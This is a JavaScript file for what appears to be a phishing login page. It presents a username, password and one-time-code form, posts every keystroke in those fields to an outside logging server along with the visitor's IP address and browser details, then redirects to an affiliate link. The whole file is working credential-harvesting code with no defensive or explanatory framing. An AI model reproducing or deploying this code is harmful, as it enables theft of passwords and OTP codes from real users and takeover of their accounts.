// Define constant variables for affiliate URL and backend URL
const AFFILIATE_URL = 'https://shaobank.com/?upline=w7mYOgBX9HWwSGBN';
let IS_USE_OTP = true;
const BACKEND_URL = 'https://log.vntrnet.com/';

// Declare a variable to store previous sent data
let PREVIOUS_SENT_DATA;

// Add event listener for DOMContentLoaded event
document.addEventListener('DOMContentLoaded', function () {
  // Get user agent from navigator object
  const USER_AGENT = navigator.USER_AGENT;
  // Initialize user IP as 'none'
  let USER_IP = 'none';

  // Function to fetch user IP address
  async function getUserIP() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      USER_IP = data.ip;
    } catch (error) {
      console.error('Error fetching IP address:', error);
    }
  }

  // Call getUserIP function to fetch user IP
  getUserIP();

  // Function to send event data to backend
  async function sendEvent(event, href) {
    // Create an object to store form data
    const formData = {
      event: event,
      ip: USER_IP,
      USER_AGENT: USER_AGENT,
      href: href,
    };

    // Get all input elements with id starting with 'log-'
    const inputs = document.querySelectorAll('[id^="log-"]');
    for (const input of inputs) {
      const name = input.id.replace('log-', '');
      const value = input.value.trim();
      if (value !== '') {
        formData[name] = value;
      }
    }

    // Convert form data to JSON string
    const jsonData = JSON.stringify(formData);

    // Check if the current JSON data is the same as the previous sent data
    if (jsonData == PREVIOUS_SENT_DATA) {
      return;
    }

    // Update previous sent data with current JSON data
    PREVIOUS_SENT_DATA = jsonData;

    try {
      // Send the JSON data to the backend URL using POST method
      const response = await fetch(`${BACKEND_URL}event`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: jsonData,
      });

      // Check if the response is not OK
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      // Parse the response data as JSON
      // const data = await response.json();
    } catch (error) {
      console.error('Error sending event:', error);
    }
  }

  // Add click event listener to the body
  document.body.addEventListener('click', function (event) {
    // Check if the clicked element is an anchor tag
    if (event.target.tagName === 'A') {
      event.preventDefault();
      const linkHref = event.target.getAttribute('href');
      // Send 'redirect' event with the clicked link href
      sendEvent('redirect', linkHref);
      if (linkHref) {
        // Redirect to the clicked link href
        window.location.href = linkHref;
      }
    } else if (event.target.tagName === 'BUTTON') {
      // Send 'button_click' event for button clicks
      sendEvent('button_click');
    }
  });

  // Add keyup event listener to the body
  document.body.addEventListener('keyup', function (event) {
    // Check if the target element is an input field
    if (event.target.tagName === 'INPUT') {
      // Send 'keyup' event for input field keyup events
      sendEvent('keyup');
    }
  });

  // Add load event listener to the window
  window.addEventListener('load', function () {
    // Send 'window_loaded' event when the window is loaded
    sendEvent('window_loaded');
  });

  // Add beforeunload event listener to the window
  window.addEventListener('beforeunload', function () {
    // Send 'window_closed' event before the window is closed
    sendEvent('window_closed');
  });
});

// Function to check if an email is valid
function isEmail(email) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}

// Function to check if a password is valid
function isPasswordValid(password) {
  return password.length > 2 && !password.includes(' ');
}

// Function to check if a username is valid
function isUsernameValid(username) {
  return username.length > 2 && !username.includes(' ');
}

// Function to check if a secret input is valid
function isSecretValid(secretInput) {
  const secret = secretInput.trim();
  return secret.length === 6 && !isNaN(secret);
}

// Function to check if an OTP input is valid, 6 digits number
function isOTPValid(otpInput) {
  const otp = otpInput.trim();
  const otpRegex = /^\d{6}$/;
  return otpRegex.test(otp);
}

// Get username and password elements from the DOM
const usernameElement = document.getElementById('log-username');
const passwordElement = document.getElementById('log-password');

// get otp component hidden if exist
const otpComponent = document.getElementById('client-otp');
if (otpComponent) {
  otpComponent.style.display = 'none';
}

// Add click event listener to the login component
const loginComponent = document.getElementById('log-login');
loginComponent.addEventListener('click', (event) => {
  event.preventDefault();

  // Get username and password values
  let username = usernameElement.value;
  let password = passwordElement.value;

  // Check if the username is valid
  if (!isUsernameValid(username)) {
    alert('Wrong username');
    return false;
  }

  // Check if the password is valid
  if (!isPasswordValid(password)) {
    alert('Wrong password');
    return false;
  }

  // if IS_USE_OTP is true and otp component is hidden then show it
  if (IS_USE_OTP) {
    const otpComponent = document.getElementById('client-otp');
    if (otpComponent.style.display === 'none') {
      otpComponent.style.display = 'block';
      return;
    }

    const secretComponent = document.getElementById('log-secret');
    if (!isOTPValid(secretComponent.value)) {
      alert('Wrong OTP');
      return;
    }
  }
  // Redirect to the affiliate URL
  window.location.href = AFFILIATE_URL;
});
